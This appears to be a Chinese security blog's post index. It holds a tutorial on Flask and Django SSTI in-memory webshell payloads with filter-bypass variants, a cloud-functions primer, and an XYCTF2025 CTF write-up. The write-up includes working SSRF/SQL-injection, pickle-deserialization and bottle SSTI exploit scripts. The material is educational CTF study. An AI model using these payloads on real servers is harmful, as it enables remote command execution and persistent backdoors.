payload：\nurl_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)\n\n我们来分析一下这个 payload\n先将他展开：\n&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](  &quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,  &#123;    &#x27;_request_ctx_stack&#x27;: url_for.__globals__[&#x27;_request_ctx_stack&#x27;],    &#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]  &#125;) &#125;&#125;\n\n步骤分解：url_for.__globals__\nurl_for 是 Flask 中的函数，而 Python 中函数对象有一个属性叫 __globals__\n所以可以通过 url_for.__globals__ 拿到全局作用域字典\n可以进一步访问到各种内置对象，比如：\n__builtins__[&#39;eval&#39;]\ncurrent_app\n_request_ctx_stack\n\n\n\n执行 eval(...) 代码eval(&quot;app.add_url_rule(...)&quot;)\n\n\n把构造好的 Python 代码字符串传入 eval()，相当于运行：\n\napp.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda: os.popen(cmd).read())\n\n注册后门路由 /shell这句代码的作用就是动态往 Flask 应用注册一个新的路由 /shell：\napp.add_url_rule(    &#x27;/shell&#x27;,          # 路由地址    &#x27;shell&#x27;,           # endpoint 名称    lambda: __import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())\n\n\nlambda: 是匿名函数，作为 view_func\nos.popen(cmd).read() 执行系统命令\n命令从当前请求对象中获取：_request_ctx_stack.top.request.args.get(&#39;cmd&#39;)\n\n执行 payload 后，内存中注册了一个后门：\n你就可以直接访问：\nhttp://localhost:5000/shell?cmd=whoami\n\n获得系统命令的执行结果\n当然了实战肯定是有过滤的，可以先 fenjing 一把梭，梭完再根据 fenjing 的 payload 的 bypass 方法对上面的 payload 进行修改\n我对 bypass 不是很擅长，直接复制粘贴了\n+ url_for可替换为get_flashed_messages或者request.__init__或者request.application.+ 代码执行函数替换, 如exec等替换eval.+ 字符串可采用拼接方式, 如[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]变为[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;].+ __globals__可用__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;)替换.+ []可用.__getitem__()或.pop()替换.+ 过滤&#123;&#123;或者&#125;&#125;, 可以使用&#123;%或者%&#125;绕过, &#123;%%&#125;中间可以执行if语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.+ 过滤_可以用编码绕过, 如__class__替换成\\x5f\\x5fclass\\x5f\\x5f, 还可以用dir(0)[0][0]或者request[&#x27;args&#x27;]或者request[&#x27;values&#x27;]绕过.+ 过滤了.可以采用attr()或[]绕过.+ 其它的手法参考SSTI绕过过滤的方法即可...\n\n这里给出两个变形Payload:\n原Payload\nurl_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)\n\n变形 payload：\nrequest.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)(    &quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;, &#x27;calc&#x27;)).read())&quot;,    &#123;        &#x27;_request_ct&#x27;+&#x27;x_stack&#x27;: get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;_request_&#x27;+&#x27;ctx_stack&#x27;),        &#x27;app&#x27;: get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;curre&#x27;+&#x27;nt_app&#x27;)    &#125;)\n\nget_flashed_messages|attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;__builtins__&quot;)|attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;eval&quot;)(  &quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;,  &#123;    &#x27;_request_ctx_stack&#x27;: get_flashed_messages      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;_request_ctx_stack&quot;),    &#x27;app&#x27;: get_flashed_messages      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)      |attr(&quot;\\x5f\\x5fgetattribute\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;current_app&quot;)  &#125;)\n\n\n你可以抽象出一套 SSTI 的「绕过骨架」模板，比如：\n&#123;&#123;   &lt;全局对象&gt;  |attr(&quot;__getattribute__&quot;)(&quot;__globals__&quot;)  |attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)  |attr(&quot;__getitem__&quot;)(&quot;eval&quot;)  (&quot;&lt;代码字符串&gt;&quot;, &#123;    &#x27;app&#x27;: &lt;全局对象&gt;|...,    &#x27;_request_ctx_stack&#x27;: &lt;全局对象&gt;|...  &#125;)&#125;&#125;\n\n然后根据不同题目的 WAF 实际情况：\n\n替换对象入口（url_for, get_flashed_messages, request 等）\n替换函数调用方式（拼接、编码、attr）\n替换代码逻辑（文件读写 &#x2F; 反弹 shell &#x2F; 打印 token）\n\n\nDjangoDjango会使用一个名为urlpatterns的全局列表来存储所有的URL路由信息。每一项由path()或re_path()函数返回，用于将 URL 映射到某个视图函数（或类视图）\n那么为了可以动态的向urlpatterns中添加新的路径，可以引入一个新的可访问端点，该端点用于接收命令和返回结果\n那么就要获取settings这个对象，从而读取到settings.py文件中的 ROOT_URLCONF（用于指定当前路由入口）\n而 Python 中函数对象有一个特殊属性__globals__，他保存了该函数所在模块的全局命名空间字典。攻击者可以从任意一个视图函数出发，通过request传入的函数对象，访问到其全局变量，包括settings、urlpatterns、其他导入模块等。在 Django 视图函数中，可以从request参数关联的任何函数出发，访问到整个模块的全局变量，包括 Django 项目的设置和URL配置。\n那么直接将其导入，就可以获得当前应用的入口\n这个时候， 就可以通过访问urls.urlpatterns来操作路由列表了\n在路由定义中，每一条路由都会调用path函数来进行定义\npath函数接收四个参数：route、view、kwargs和name，其中kwargs和name是可选参数。主要关注的是前两个参数：\nroute: 这是一个字符串，表示匹配的URL模式。\nview: 这是一个可调用对象，当URL匹配时会被调用。它可以是：\n\n一个普通的Python函数（视图函数）\n一个继承自django.views.View的类，并通过.as_view()方法转换为可调用对象\n包含(urlconf_module, app_name, namespace)的元组或列表，用于包含其他URL配置\n\n_path函数对view参数有特定的要求，具体如下：\n\n如果view是一个可调用对象（例如普通函数或实现了__call__方法的对象），则直接将其作为视图函数处理。\n如果view是一个包含(urlconf_module, app_name, namespace)的元组或列表，则用于包含其他URL配置。\n如果view是一个继承自django.views.View的类，则需要调用其.as_view()方法将其转换为可调用对象。\n如果view不符合上述任何一种情况，则会抛出TypeError异常。由于_path函数要求视图参数必须是可调用的，我们可以使用Python 的 lambda 表达式来快速定义一个简单的视图函数。 Lambda 表达式是一种创建匿名函数的方式，非常适合这种场景。\n\npayload：\n__import__(&#x27;django&#x27;).urls.path(&#x27;shell&#x27;,     lambda request: __import__(&#x27;django&#x27;).http.HttpResponse(        __import__(&#x27;os&#x27;).popen(request.GET.get(&#x27;cmd&#x27;,&#x27;id&#x27;)).read()    ))\n\n分解逻辑：\n\nimport(‘django’)：动态导入 django 模块（等价于 import django）\n.urls.path(…)：调用 django.urls.path 函数，创建一个 URL 路由规则\n‘shell’：设置路由路径 &#x2F;shell&#x2F;\nlambda request: …：视图函数，接收 request，执行命令并返回结果\nimport(‘os’).popen(…)：使用 os.popen 执行命令request.GET.get(‘cmd’, ‘id’)：从 GET 请求中读取参数 cmd，默认执行 id\nHttpResponse(…)：返回命令执行的结果\n\n将这个新路由 append 到 app.urlpatterns 中就可以实现内存马\n__import__(request.get_port.__globals__[&quot;settings&quot;].ROOT_URLCONF).urls.urlpatterns.append(__import__(&#x27;django&#x27;).urls.path(&#x27;shell&#x27;,lambda request: __import__(&#x27;django&#x27;).http.HttpResponse(__import__(&#x27;os&#x27;).popen(request.GET.get(&#x27;cmd&#x27;,&#x27;id&#x27;)).read())))\n\n也可以使用subprocess.check_output()来执行命令\n__import__(__import__(&#x27;django.conf&#x27;).conf.settings.ROOT_URLCONF).urls.urlpatterns.append(    __import__(&#x27;django&#x27;).urls.path(&#x27;nnn&#x27;,         lambda request: __import__(&#x27;django.http&#x27;).http.HttpResponse(            __import__(&#x27;subprocess&#x27;).check_output(                request.GET.get(&#x27;cmd&#x27;, &#x27;id&#x27;), shell=True)        )    ))\n\n\n因为 SSTI 是好久前看的了，平常又不怎么用到，早就忘光光了，导致又花时间过了一遍基础\n","tags":["web安全"]},{"title":"云函数攻防","url":"/2025/07/19/%E4%BA%91%E5%87%BD%E6%95%B0%E6%94%BB%E9%98%B2/","content":"在学习云函数之前，我们要先了解一下Serverless\nServerless概述简单来说，Serverless就是无需管理服务器的架构模式，我们只需要写业务代码，云平台会自动处理部署、弹性扩容、资源调度、运维运作等一切幕后工作\n在狭义上来讲Serverless可以分成以下两个方面\n┌───────────────────────────────────────────────────────────┐│                        Serverless                         │└────────────┬────────────────────────────────┬─────────────┘             │                                │ ┌───────────▼────────────┐      ┌────────────▼───────────┐ │  FaaS：函数即服务       │      │  BaaS：后端即服务       │ │  Function as a Service │      │  Backend as a Service  │ └────────────────────────┘      └────────────────────────┘\n\n无服务器（Serverless）不是表示没有服务器，而是表示当使用Serverless时，我们无需关心底层的资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。\n本文主要研究的是函数即服务，也就是云函数\n什么是云函数首先，函数我们都了解，是程序中的一段可以被重复调用、具有特定功能的代码结构\n云函数就是一种运行在云端的函数，属于 Serverless 架构的核心组件。你只需编写函数代码，云平台自动完成运行环境、部署、调度和扩容。 真正实现了只写业务逻辑，其他全部自动化  \n函数即服务提供的是一种直接在云上运行无状态的、短暂的、由事件触发的代码的能力。\n函数即服务和传统应用架构不同，函数即服务提供的是事件触发式的运行方式，云函数不是始终运行的状态，而是在事件发生时由事件触发运行，并且在一次运行的过程中处理这一次事件。因此在云函数的代码中，仅需考虑针对一个事件的处理流程，而针对大量事件的高并发处理，由平台实现云函数的多实例并发来支持。\n云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。\n偷一张图片来，便于理解\n\n当服务没有被请求时，云计算上并没有这个函数的实例。一旦请求发出，调度平台将以毫秒级的服务实例化一个服务并完成响应。请求处理完成后，调度服务又将自动收回这个实例。云函数的使用成本只要是由调用次数、资源使用量和外网出流量等统计出来，而如果在业务低谷期，访问量少的时候，运维的成本是很小的。对于创业公司来讲，可以省去大部分初期运维的费用，可见价值还是很大的\n执行方法对应项目的main函数是程序执行的起点\n在调用云函数时，首先会寻找执行方法作为入口，执行用户的代码，用户需以文件名.执行方法名的形式进行设置\n例如用户设置的执行方法为 index.handler，则 SCF 平台会首先寻找代码程序包中的 index 文件，并找到该文件中的 handler 方法开始执行。\n函数入参函数入参，是指函数在被触发调用时所传递给函数的内容。通常情况下，函数入参包括 event 和 context 两部分，但根据开发语言和环境的不同，入参个数可能有所不同\neventevent 参数类型为 dict，event 中包含了触发函数执行的基本信息，可以是平台定义的格式，也可以自定义格式。函数被触发开始执行后，可以在代码内部对 event 进行处理\n有两种方法可以触发云函数SCF执行：\n\n通过调用云API触发函数执行\n通过绑定触发器触发函数执行\n\ncontextcontext 为 SCF 平台提供的入参，将 context 入参传递给执行方法，代码可通过解析 context 入参对象，获取到运行环境及当前请求的相关信息\n具体可以看腾讯云的官方手册，这里不再赘述\n云函数 基本概念_腾讯云\n函数返回SCF 平台会获取到云函数执行完成后的返回值，并根据下表中不同的触发方式进行处理。\n\n\n\n触发方式\n处理方式\n\n\n\n同步触发\n通过 API 网关、云 API 同步 invoke 触发函数的方式为同步触发。使用同步方式触发的函数在执行期间，SCF 平台不会返回触发结果。在函数执行完成后，SCF 平台会将函数返回值封装为 JSON 格式并返回给调用方。\n\n\n异步触发\n使用异步方式触发的云函数，SCF 平台接收触发事件后，会返回触发请求 ID 。在函数执行完成后，函数的返回值会封装为 JSON 格式并存储在日志中。用户可在函数执行完成后，通过返回的请求 ID 查询日志获取该异步触发函数的返回值。\n\n\n当函数中的代码返回具体值时，通常返回特定的数据结构。例如 ：\n\n\n\n运行环境\n返回数据结构类型\n\n\n\nPython\n简单数据结构或 dict 数据结构\n\n\nNode.js\nJSON Object\n\n\nPHP\nArray 结构\n\n\nGO\n简单的数据结构或带有 JSON 描述的 struct\n\n\n为保证针对各开发语言和环境的统一性，函数返回会使用 JSON 数据格式统一封装。SCF 平台在获取到例如以上运行环境函数的返回值后，将会对返回的数据结构进行 JSON 化，并返回 JSON 内容到调用方。\n触发器和触发源\n任何可以产生事件，触发云函数执行的均可以被称为触发器或触发源。触发器在本身产生事件后，通过将事件传递给云函数来触发函数运行。\n触发器在触发函数时，可以根据自身特点，使用同步或异步方式触发函数。同步方式触发函数时，触发器将等待函数执行完成并获取到函数执行结果；异步方式触发函数时，触发器将仅触发函数而忽略函数执行结果。\n腾讯云云函数在和腾讯云的某些产品或服务对接时，也有自身实现的一些特殊方式，例如推（PUSH）模式和拉（PULL）模式。\n推模式：触发器主动将事件推送至云函数平台并触发函数运行。\n拉模式：云函数平台通过拉取模块，从触发器中拉取到事件并触发云函数运行。\n\n\n\n攻防方面，我们也可以通过云函数实现一系列操作，例如各种扫描器，还有一些其他的，基本上就是基于python的，可以去看python黑帽子这本书，附上我创业未半中道崩殂的知识库链接https://www.yuque.com/u49948530/us3qv7\n至于实操的话，鼠鼠手里没有米，没钱买云服务，下次一定\n","tags":["云安全"]},{"title":"XYCTF2025-wp","url":"/2025/08/09/XYCTF2025-wp/","content":"比赛是之前打的，但是一直没有复盘，暑假闲来无事故决定复盘一下，也是作为复习\nWEBfate#!/usr/bin/env python3import flaskimport sqlite3import requestsimport stringimport jsonapp = flask.Flask(__name__)blacklist = string.ascii_lettersdef binary_to_string(binary_string):    if len(binary_string) % 8 != 0:        raise ValueError(&quot;Binary string length must be a multiple of 8&quot;)    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]    string_output = &#x27;&#x27;.join(chr(int(chunk, 2)) for chunk in binary_chunks)        return string_output@app.route(&#x27;/proxy&#x27;, methods=[&#x27;GET&#x27;])def nolettersproxy():    url = flask.request.args.get(&#x27;url&#x27;)    if not url:        return flask.abort(400, &#x27;No URL provided&#x27;)        target_url = &quot;http://lamentxu.top&quot; + url    for i in blacklist:        if i in url:            return flask.abort(403, &#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;)    if &quot;.&quot; in url:        return flask.abort(403, &#x27;No ssrf allowed&#x27;)    response = requests.get(target_url)    return flask.Response(response.content, response.status_code)def db_search(code):    with sqlite3.connect(&#x27;database.db&#x27;) as conn:        cur = conn.cursor()        cur.execute(f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;&#123;code&#125;&#x27;)))))))&quot;)        found = cur.fetchone()    return None if found is None else found[0]@app.route(&#x27;/&#x27;)def index():    print(flask.request.remote_addr)    return flask.render_template(&quot;index.html&quot;)@app.route(&#x27;/1337&#x27;, methods=[&#x27;GET&#x27;])def api_search():    if flask.request.remote_addr == &#x27;127.0.0.1&#x27;:        code = flask.request.args.get(&#x27;0&#x27;)        if code == &#x27;abcdefghi&#x27;:            req = flask.request.args.get(&#x27;1&#x27;)            try:                req = binary_to_string(req)                print(req)                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)            except:                flask.abort(400, &quot;Invalid JSON&quot;)            if &#x27;name&#x27; not in req:                flask.abort(400, &quot;Empty Person&#x27;s name&quot;)            name = req[&#x27;name&#x27;]            if len(name) &gt; 6:                flask.abort(400, &quot;Too long&quot;)            if &#x27;\\&#x27;&#x27; in name:                flask.abort(400, &quot;NO &#x27;&quot;)            if &#x27;)&#x27; in name:                flask.abort(400, &quot;NO )&quot;)            &quot;&quot;&quot;            Some waf hidden here ;)            &quot;&quot;&quot;            fate = db_search(name)            if fate is None:                flask.abort(404, &quot;No such Person&quot;)            return &#123;&#x27;Fate&#x27;: fate&#125;        else:            flask.abort(400, &quot;Hello local, and hello hacker&quot;)    else:        flask.abort(403, &quot;Only local access allowed&quot;)if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)\n\n\n有源码，有SQL查询语句，但是无法绕过\n通过 init_db.py 我们可以知道。flag 在 LamentXU 对应的值里。但是 LamentXU 的长度 &gt;6，因此不能直接查询\n&#x2F;1377 路由只能从本地访问，所以思路就是利用 &#x2F;proxy 打 SSRF 访问 &#x2F;1337\n并且题目中用 json.loads() ，而且还有提示，那么就可以利用到 python 格式化字符串漏洞，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串\n那么就可以用\n&#123;&quot;name&quot;:&#123;&quot;&#x27;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#x27;LAMENTXU&#x27; --&quot;:1&#125;&#125;\n\n拼接进SQL查询语句中就是这样的\nSELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;&#123;&quot;&#x27;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#x27;LAMENTXU&#x27; --&quot;:1&#125;&#x27;)))))))\n\nSSRF部分：\n\n在前面加入lamentxu.top，这个可以用@来绕过。\n禁止了所有字母和.，那么我们使用2130706433来表示127.0.0.1。\n必须要传入参数0为abcdef。使用二次URL编码绕过。\n\npayload：\n/proxy?url=@2130706433:8080/1337?1=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101%260=%2561%2562%2563%2564%2565%2566%2567%2568%2569\n\n看起来有点花里胡哨，我们拆解一下，@2130706433:8080/1337 利用 130706433 来表示 127.0.0.1，绕过对字母和 . 的限制\n后面一串二进制：给 1 传参，传参内容是 &#123;&quot;name&quot;:&#123;&quot;&#39;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#39;LAMENTXU&#39; --&quot;:1&#125;&#125; 的二进制编码\n%260=%2561%2562%2563%2564%2565%2566%2567%2568%2569 用二次 URL 编码绕过 0&#x3D;abcdefghi 检查\nflag{Do4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus!}\nSignin# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   main.py@Time    :   2025/03/28 22:20:49@Author  :   LamentXU &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;flag in /flag_&#123;uuid4&#125;&#x27;&#x27;&#x27;from bottle import Bottle, request, response, redirect, static_file, run, routewith open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:    secret = f.read()app = Bottle()@route(&#x27;/&#x27;)def index():    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;@route(&#x27;/download&#x27;)def download():    name = request.query.filename    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\\\&#x27; in name:        response.status = 403        return &#x27;Forbidden&#x27;    with open(name, &#x27;rb&#x27;) as f:        data = f.read()    return data@route(&#x27;/secret&#x27;)def secret_page():    try:        session = request.get_cookie(&quot;name&quot;, secret=secret)        if not session or session[&quot;name&quot;] == &quot;guest&quot;:            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;            response.set_cookie(&quot;name&quot;, session, secret=secret)            return &#x27;Forbidden!&#x27;        if session[&quot;name&quot;] == &quot;admin&quot;:            return &#x27;The secret has been deleted!&#x27;    except:        return &quot;Error!&quot;run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)\n\n这个是 pickle 反序列化\n&#x2F;download 路由里有一个 secret.txt 可下载，直接构造目录穿越 payload\n/download?filename=./.././.././../secret.txt\n\n读取到 secret.txt\nHell0_H@cker_Y0u_A3r_Sm@r7\n\n下面有一个 &#x2F;secret 路由，这个先不管，先说 bottle\nbottle 的 cookie 是直接用 pickle 序列化的，所以可以打反序列化（比赛当时就摸了两个小时，没想到去看 bottle 源码┭┮﹏┭┮）\ndef get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):    &quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the        `secret` must match the one used to create the cookie (see        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing        cookie or wrong signature), return a default value. &quot;&quot;&quot;    value = self.cookies.get(key)    if secret:        # See BaseResponse.set_cookie for details on signed cookies.        if value and value.startswith(&#x27;!&#x27;) and &#x27;?&#x27; in value:            sig, msg = map(tob, value[1:].split(&#x27;?&#x27;, 1))            hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()            if _lscmp(sig, base64.b64encode(hash)):                dst = pickle.loads(base64.b64decode(msg))                if dst and dst[0] == key:                    return dst[1]        return default    return value or default\n\n可以看到对cookie进行了反序列化，那么我们只要传入一个序列化的恶意代码就好\nexp：\nfrom bottle import cookie_encodeimport osimport requestssecret = &quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;class Test:    def __reduce__(self):        return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./2.txt&#x27;)&quot;&quot;&quot;,))exp = cookie_encode(    (&#x27;session&#x27;, &#123;&quot;name&quot;: [Test()]&#125;),    secret)requests.get(&#x27;http://gz.imxbt.cn:20458/secret&#x27;, cookies=&#123;&#x27;name&#x27;: exp.decode()&#125;)\n\nflag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}\n出题人已疯做题人已疯（\n出题人出了很多 bottle，但是问题是我没了解过，既然事已至此，那就等后面再总结一下 bottle 的漏洞吧\n# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   app.py@Time    :   2025/03/29 15:52:17@Author  :   LamentXU &#x27;&#x27;&#x27;import bottle&#x27;&#x27;&#x27;flag in /flag&#x27;&#x27;&#x27;@bottle.route(&#x27;/&#x27;)def index():    return &#x27;Hello, World!&#x27;@bottle.route(&#x27;/attack&#x27;)def attack():    payload = bottle.request.query.get(&#x27;payload&#x27;)    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\\\&#x27; not in payload:        return bottle.template(&#x27;hello &#x27;+payload)    else:        bottle.abort(400, &#x27;Invalid payload&#x27;)if __name__ == &#x27;__main__&#x27;:    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)\n\nbottle 的 SSTI 可以直接访问到内部类，官方exp：\nimport requestsurl = &#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;payload = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;p = [payload[i:i+3] for i in range(0,len(payload),3)]flag = Truefor i in p:    if flag:        tmp = f&#x27;\\n%import os;os.a=&quot;&#123;i&#125;&quot;&#x27;        flag = False    else:        tmp = f&#x27;\\n%import os;os.a+=&quot;&#123;i&#125;&quot;&#x27;    r = requests.get(url,params=&#123;&quot;payload&quot;:tmp&#125;)r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\\n%import os;eval(os.a)&quot;&#125;)r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\\n%include(&#x27;123&#x27;)&quot;&#125;).textprint(r)\n\n原理是直接往os里塞字符。随后一起拿出来exec\n出题人又疯做题人又疯（\nban的字符更多了\n# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   app.py@Time    :   2025/03/29 15:52:17@Author  :   LamentXU &#x27;&#x27;&#x27;import bottle&#x27;&#x27;&#x27;flag in /flag&#x27;&#x27;&#x27;@bottle.route(&#x27;/&#x27;)def index():    return &#x27;Hello, World!&#x27;blacklist = [    &#x27;o&#x27;, &#x27;\\\\&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;, &#x27;os&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;system&#x27;, &#x27; &#x27;, &#x27;;&#x27;, &#x27;read&#x27;]@bottle.route(&#x27;/attack&#x27;)def attack():    payload = bottle.request.query.get(&#x27;payload&#x27;)    if payload and len(payload) &lt; 25 and all(c not in payload for c in blacklist):        print(payload)        return bottle.template(&#x27;hello &#x27;+payload)    else:        bottle.abort(400, &#x27;Invalid payload&#x27;)if __name__ == &#x27;__main__&#x27;:    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)\n\n只要把 a 替换为 %aa 来构造 payload 就好\n上面那里也可以用替换，用 %ba 替换o\nNow you see me如出题人所说，没有 fenjing 就不会打 SSTI 了\n而且真的坐牢，我投降喵┭┮﹏┭┮\nezsql(手动滑稽)tab 键绕过空格；from 绕过 limit 然后使⽤ awk 和 cut -c 来遍历前⾯命令执⾏的结果\nez_puzzleban 了右键和 F12，但是有很多方法可以绕过限制，我的方法是用 hackbar 直接 execute 题目容器\n然后可以在控制台改时间或者是查弹窗获得 flag\nMISC签个到吧用可视化编译器查看，不过我当时是手撕的，具体应该就是根据给出的来算 ascii 然后转字符\n会飞的雷克萨斯盒武器\n曼波曼波曼波附件是逆序 base64 的图片，用 foremost 能分离出一个 zip，解压得到一个 png，还有一个压缩包，根据提示猜测密码是 XYCTF2025，解压又得到一个 png，然后得到图片就能发现是盲水印\nCRYPTOdivisionai一把梭出来的，不懂\nREVERSEWARMUPvbs 文件逆向，直接把前面的 Execute 改成 wscript.echo 就能显示出源码\nMsgBox &quot;Dear CTFER. Have fun in XYCTF 2025!&quot;flag = InputBox(&quot;Enter the FLAG:&quot;, &quot;XYCTF&quot;)wefbuwiue = &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot; &#x27; C4qwfe = &quot;rc4key&quot;&#x27; RC4Function RunRC(sMessage, strKey)    Dim kLen, i, j, temp, pos, outHex    Dim s(255), k(255)    &#x27; ?    kLen = Len(strKey)    For i = 0 To 255        s(i) = i        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) &#x27; ASCII    Next    &#x27; KSA    j = 0    For i = 0 To 255        j = (j + s(i) + k(i)) Mod 256        temp = s(i)        s(i) = s(j)        s(j) = temp    Next    &#x27; PRGA    i = 0 : j = 0 : outHex = &quot;&quot;    For pos = 1 To Len(sMessage)        i = (i + 1) Mod 256        j = (j + s(i)) Mod 256        temp = s(i)        s(i) = s(j)        s(j) = temp        &#x27; ?        Dim plainChar, cipherByte        plainChar = Asc(Mid(sMessage, pos, 1)) &#x27; SCII        cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar        outHex = outHex &amp; Right(&quot;0&quot; &amp; Hex(cipherByte), 2)    Next    RunRC = outHexEnd Function&#x27;If LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then    MsgBox &quot;Congratulations! Correct FLAG!&quot;Else    MsgBox &quot;Wrong flag.&quot;End If\n这是源码，就是一个简单的 RC4，key 是 rc4key，找个在线网站解了就行\n\nLamentXU 